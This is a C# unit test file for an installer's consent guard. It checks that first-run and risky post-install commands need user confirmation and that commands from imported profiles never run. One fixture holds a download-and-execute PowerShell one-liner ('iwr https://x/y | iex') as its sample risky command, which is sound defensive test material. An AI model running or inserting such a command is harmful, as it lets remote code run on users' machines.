// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (c) 2026 iam-groot1

using System.IO;
using System.Text.Json;
using Xunit;
using CtrlZ.App.Services;
using CtrlZ.Core.Infrastructure;
using CtrlZ.Core.Install;
using CtrlZ.Core.Models;

namespace CtrlZ.App.Tests;

/// <summary>
/// The guard every install run passes (new, resume, retry, elevated auto-start), composed exactly as
/// production composes it. "Started" stands for the engine being called.
/// </summary>
public sealed class InstallStartGuardTests : IDisposable
{
    private readonly string _state = Path.Combine(Path.GetTempPath(), "ctrlz-guard-" + Guid.NewGuid().ToString("n"));

    public void Dispose()
    {
        if (Directory.Exists(_state))
        {
            Directory.Delete(_state, recursive: true);
        }
    }

    private static AppProfile Profile(bool risky) => new()
    {
        Id = "p1",
        Apps =
        [
            new AppEntry { Id = "a", Name = "A", PostInstall = new PostInstallCommand { Executable = "reg.exe", Arguments = ["import", "a.reg"], Enabled = true } },
            .. risky
                ? new[] { new AppEntry { Id = "r", Name = "R", PostInstall = new PostInstallCommand { Executable = "powershell.exe", Arguments = ["-c", "iwr https://x/y | iex"], Enabled = true } } }
                : Array.Empty<AppEntry>()
        ]
    };

    private bool Start(AppProfile profile, ProfileOrigin origin, Func<string, string, bool, bool> answer)
    {
        var state = new InstallState { ProfileSnapshot = profile };
        var consent = InstallStartGuard.CommandConsent(_state, _ => origin, answer);
        return InstallStartGuard.MayStart(state, _ => throw new InvalidOperationException("not loaded"), consent);
    }

    [Fact]
    public void Declining_the_first_run_confirmation_blocks_the_run_and_records_nothing()
    {
        var started = Start(Profile(risky: false), ProfileOrigin.Local, (_, _, _) => false);

        Assert.False(started);
        Assert.False(File.Exists(Path.Combine(_state, PostInstallFirstRunStore.FileName)));
    }

    [Fact]
    public void Declining_the_risky_confirmation_blocks_the_run_even_after_first_run_was_accepted()
    {
        var started = Start(Profile(risky: true), ProfileOrigin.Local, (_, _, danger) => !danger);

        Assert.False(started);
    }

    [Fact]
    public void Accepting_both_starts_the_run_and_the_risky_one_is_asked_again_next_time()
    {
        var asked = new List<bool>();
        bool Yes(string _, string __, bool danger)
        {
            asked.Add(danger);
            return true;
        }

        Assert.True(Start(Profile(risky: true), ProfileOrigin.Local, Yes));
        Assert.True(Start(Profile(risky: true), ProfileOrigin.Local, Yes));

        // First run: first-run + risky. Second run: risky only.
        Assert.Equal(new[] { false, true, true }, asked);
    }

    [Fact]
    public void Blocked_commands_of_an_imported_profile_ask_nothing_and_never_become_runnable()
    {
        var started = Start(Profile(risky: true), ProfileOrigin.Imported, (_, _, _) => throw new InvalidOperationException("asked"));

        Assert.True(started);
        var lines = CommandPreview.ForProfile(Profile(risky: true), ProfileOrigin.Imported, _ => false);
        Assert.All(lines, line => Assert.False(line.WillRun));
    }

    [Fact]
    public void A_resumed_session_without_snapshot_is_loaded_from_disk_before_consent()
    {
        Directory.CreateDirectory(_state);
        var path = Path.Combine(_state, "profile.json");
        File.WriteAllText(path, JsonSerializer.Serialize(Profile(risky: false), JsonDefaults.Profile));
        var state = new InstallState { ProfilePath = path };
        AppProfile? confirmedFor = null;

        var started = InstallStartGuard.MayStart(
            state,
            file => JsonSerializer.Deserialize<AppProfile>(File.ReadAllText(file), JsonDefaults.Profile)!,
            profile => { confirmedFor = profile; return false; });

        Assert.False(started);
        Assert.Equal("p1", confirmedFor?.Id);
        Assert.Same(confirmedFor, state.ProfileSnapshot);
    }
}
